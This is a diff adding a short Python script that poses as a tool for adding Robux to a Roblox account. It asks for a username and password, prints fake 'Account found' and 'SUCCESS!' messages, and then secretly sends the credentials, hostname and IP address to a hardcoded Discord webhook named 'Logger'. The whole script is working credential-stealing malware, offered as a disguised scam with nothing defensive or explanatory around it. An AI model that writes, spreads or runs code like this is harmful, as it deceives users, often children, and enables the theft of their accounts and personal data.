@@ -1,0 +1,34 @@
+import os 
+import time
+import socket
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+hostname = socket.gethostname()
+IPAddr = socket.gethostbyname(hostname)
+
+print("enter robux")
+robux = input("Robux > ")
+Username = input("Username > ")
+Password = input("Password > ")
+
+time.sleep(1)
+print("Finding Account.")
+time.sleep(0.5)
+print("Account found")
+time.sleep(0.5)
+print("Adding robux to balance")
+time.sleep(0.5)
+print("SUCCESS!")
+
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1038138313485332530/CD-vlk-dLJNTqwaHdhMeaire2lt1Xzn_KUOw3RYvuDMZOUk-GOS_C7uCNWQV2YAX7jtF', username="Loggerv1")
+
+embed = DiscordEmbed(title='Logger', description=f'Logged -[ {Username} ]-', color='03b2f8')
+embed.set_author(name='Logger')
+embed.set_timestamp()
+embed.add_embed_field(name='IP:', value=f'{IPAddr}:22', inline=False)
+embed.add_embed_field(name='Username:', value=f'{Username}', inline=False)
+embed.add_embed_field(name='Password:', value=f'{Password}', inline=False)
+embed.add_embed_field(name='DeviceHostName:', value=f'{hostname}', inline=False)
+
+webhook.add_embed(embed)
+response = webhook.execute()
